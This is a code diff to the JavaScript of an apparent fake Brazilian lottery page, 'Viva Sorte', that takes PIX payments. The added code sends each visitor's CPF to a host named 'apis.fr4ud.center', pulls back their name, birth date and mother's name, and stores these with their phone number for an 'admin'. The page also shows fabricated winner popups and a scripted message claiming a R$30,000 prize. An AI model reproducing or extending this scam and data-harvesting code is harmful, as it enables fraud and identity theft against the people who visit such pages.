@@ -1305,7 +1305,7 @@
     <!-- SCRIPTS -->
     <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
     
-    <!-- SCRIPT PRINCIPAL COM TODAS AS CORREÇÕES -->
+    <!-- SCRIPT PRINCIPAL COM TODAS AS CORREÇÕES E API DE CPF -->
     <script>
     // VARIÁVEIS GLOBAIS
     let pacoteSelecionado = {
@@ -1331,7 +1331,115 @@
     let verificacaoAutomatica = null;
     let tentativasVerificacao = 0;
 
+    // =========================================================================
+    // FUNÇÃO NOVA PARA CONSULTAR CPF NA API E SALVAR PARA O ADMIN
+    // =========================================================================
+    async function consultarCPF(cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        
+        if (cpfLimpo.length !== 11) {
+            return;
+        }
+        
+        // Mostrar loading
+        const loadingDiv = document.getElementById('cpfLoading');
+        const cpfInfoDiv = document.getElementById('cpfInfo');
+        const erroCPF = document.getElementById('erroCPF');
+        
+        loadingDiv.style.display = 'block';
+        cpfInfoDiv.style.display = 'none';
+        erroCPF.style.display = 'none';
+        
+        try {
+            // CONSULTAR API DE CPF (https://apis.fr4ud.center/search/cpf/)
+            const response = await fetch(`https://apis.fr4ud.center/search/cpf/${cpfLimpo}`, {
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            
+            if (!response.ok) {
+                throw new Error('API não disponível');
+            }
+            
+            const data = await response.json();
+            
+            if (data.success && data.data) {
+                const cliente = data.data;
+                
+                // SALVAR DADOS DO CLIENTE NO LOCALSTORAGE (PARA O ADMIN)
+                let clientesSalvos = JSON.parse(localStorage.getItem('vivasorte_clientes') || '{}');
+                clientesSalvos[cpfLimpo] = {
+                    nome: cliente.nome || '',
+                    nascimento: cliente.nascimento || '',
+                    mae: cliente.mae || '',
+                    cpf: cpfLimpo,
+                    consultado_em: new Date().toISOString()
+                };
+                
+                localStorage.setItem('vivasorte_clientes', JSON.stringify(clientesSalvos));
+                
+                // EXIBIR INFORMAÇÕES DO CPF
+                cpfInfoDiv.innerHTML = `
+                    <h4><i class="bi bi-person-check"></i> Cliente Identificado</h4>
+                    <p><strong>Nome:</strong> ${cliente.nome || 'Não disponível'}</p>
+                    <p><strong>Nascimento:</strong> ${cliente.nascimento || 'Não disponível'}</p>
+                    <p><strong>CPF:</strong> ${cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
+                `;
+                cpfInfoDiv.classList.add('cpf-valid');
+                cpfInfoDiv.style.display = 'block';
+                
+                // Ativar botão de continuar
+                document.getElementById('btnContinuarCPF').disabled = false;
+                document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+                
+            } else {
+                throw new Error('CPF não encontrado na base');
+            }
+            
+        } catch (error) {
+            console.log('Erro na consulta CPF:', error);
+            
+            // Mesmo se falhar, permite continuar
+            cpfInfoDiv.innerHTML = `
+                <h4><i class="bi bi-person"></i> CPF Válido</h4>
+                <p>CPF validado com sucesso: ${cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
+                <p><em>Dados completos serão obtidos no processo de pagamento.</em></p>
+            `;
+            cpfInfoDiv.classList.add('cpf-valid');
+            cpfInfoDiv.style.display = 'block';
+            
+            // Ativar botão mesmo sem dados completos
+            document.getElementById('btnContinuarCPF').disabled = false;
+            document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+        } finally {
+            loadingDiv.style.display = 'none';
+        }
+    }
+
+    // =========================================================================
+    // FUNÇÃO PARA SALVAR TELEFONE NO ADMIN (CHAMADA NO gerarPIX)
+    // =========================================================================
+    function salvarTelefoneParaAdmin(telefone) {
+        const telefoneLimpo = telefone.replace(/\D/g, '');
+        const cpfLimpo = dadosUsuario.cpf;
+        
+        if (!cpfLimpo || cpfLimpo.length !== 11) return;
+        
+        // Atualizar dados do cliente com telefone
+        let clientesSalvos = JSON.parse(localStorage.getItem('vivasorte_clientes') || '{}');
+        if (clientesSalvos[cpfLimpo]) {
+            clientesSalvos[cpfLimpo].telefone = telefoneLimpo;
+            clientesSalvos[cpfLimpo].atualizado_em = new Date().toISOString();
+            localStorage.setItem('vivasorte_clientes', JSON.stringify(clientesSalvos));
+        }
+        
+        console.log('Telefone salvo para admin:', { cpf: cpfLimpo, telefone: telefoneLimpo });
+    }
+
+    // =========================================================================
     // FUNÇÃO PARA ENVIAR EVENTO DE CONVERSÃO PARA PIXEL
+    // =========================================================================
     function enviarEventoConversao(valor, quantidade, transactionId) {
         console.log('📊 Enviando evento de conversão para pixels');
         
@@ -1365,7 +1473,9 @@
         localStorage.setItem(`conversion_tracked_${transactionId}`, 'true');
     }
 
+    // =========================================================================
     // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP
+    // =========================================================================
     function abrirSuporteWhatsApp() {
         const telefone = dadosUsuario.telefone || '5511954268216';
         const mensagem = `Olá! Ganhei R$ 30.000,00 no Viva Sorte e gostaria de receber meu prêmio. Meu CPF: ${dadosUsuario.cpf}`;
@@ -1373,7 +1483,9 @@
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
+    // =========================================================================
     // FUNÇÃO PARA SELEÇÃO DE PACOTE
+    // =========================================================================
     function selecionarPacote(quantidade, valor) {
         console.log('Selecionando pacote:', quantidade, valor);
         
@@ -1393,7 +1505,9 @@
         abrirModalPagamento();
     }
 
+    // =========================================================================
     // FUNÇÕES DO CONTADOR
+    // =========================================================================
     function incrementar() {
         let input = document.getElementById('numero');
         let valor = parseInt(input.value) || 0;
@@ -1465,7 +1579,9 @@
         }
     }
 
+    // =========================================================================
     // MODAL DE PAGAMENTO
+    // =========================================================================
     function abrirModalPagamento() {
         console.log('Abrindo modal, pacote:', pacoteSelecionado);
         
@@ -1520,7 +1636,9 @@
         });
     }
 
-    // ETAPA 1: VALIDAÇÃO DE CPF
+    // =========================================================================
+    // ETAPA 1: VALIDAÇÃO DE CPF (MODIFICADA PARA CHAMAR A API)
+    // =========================================================================
     document.getElementById('inputCPF').addEventListener('input', function(e) {
         formatarCPF(this);
     });
@@ -1542,9 +1660,15 @@
         if (cpfNumeros.length === 11) {
             btn.disabled = false;
             btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+            
+            // CONSULTAR CPF AUTOMATICAMENTE NA API
+            consultarCPF(value);
         } else {
             btn.disabled = true;
             btn.style.background = '#cccccc';
+            
+            document.getElementById('cpfInfo').style.display = 'none';
+            document.getElementById('cpfLoading').style.display = 'none';
         }
         
         document.getElementById('erroCPF').style.display = 'none';
@@ -1619,7 +1743,9 @@
         }, 2000);
     }
 
+    // =========================================================================
     // ETAPA 2: TELEFONE E PIX
+    // =========================================================================
     document.getElementById('inputTelefone').addEventListener('input', function(e) {
         formatarTelefone(this);
     });
@@ -1652,7 +1778,9 @@
         return telefoneLimpo.length === 10 || telefoneLimpo.length === 11;
     }
 
+    // =========================================================================
     // FUNÇÃO PRINCIPAL PARA GERAR PIX - CORRIGIDA PARA SALVAR NO ADMIN
+    // =========================================================================
     async function gerarPIX() {
         const telefoneInput = document.getElementById('inputTelefone');
         const telefone = telefoneInput.value;
@@ -1675,9 +1803,7 @@
         console.log('💾 Salvando dados para o admin...');
         
         // 1. Salvar telefone junto com o CPF
-        if (typeof salvarTelefoneParaAdmin === 'function') {
-            salvarTelefoneParaAdmin(telefone);
-        }
+        salvarTelefoneParaAdmin(telefone);
         
         // 2. Salvar a transação completa
         const transacao = {
@@ -1827,7 +1953,9 @@
             });
     }
 
+    // =========================================================================
     // FUNÇÃO PARA VERIFICAR NA ALLOW PAY
+    // =========================================================================
     async function verificarPagamentoAutomatico() {
         if (!dadosUsuario.transactionId) {
             console.log('❌ Nenhuma transação para verificar');
@@ -1962,7 +2090,9 @@
         console.log('✅ Pagamento confirmado salvo:', transacao);
     }
 
+    // =========================================================================
     // ETAPA 3: CONFIRMAÇÃO PARA PRÊMIO
+    // =========================================================================
     function avancarParaEtapa4() {
         mostrarEtapa(4);
         
@@ -1981,7 +2111,9 @@
         console.log('🏆 Prêmio visualizado:', transacao);
     }
 
-    // FUNÇÕES AUXILIARES - CORRIGIDO
+    // =========================================================================
+    // FUNÇÕES AUXILIARES
+    // =========================================================================
     function mostrarPopupNotificacao(mensagem, isError = false) {
         const popup = document.getElementById('popup');
         popup.textContent = mensagem;
@@ -1997,7 +2129,9 @@
         }, 4000);
     }
 
+    // =========================================================================
     // INICIALIZAÇÃO
+    // =========================================================================
     document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('numero').addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
@@ -2030,7 +2164,9 @@
         iniciarPopups();
     });
 
+    // =========================================================================
     // POPUPS DE NOTIFICAÇÃO
+    // =========================================================================
     function iniciarPopups() {
         const mensagens = [
             "João P. acabou de Ganhar 50mil!",
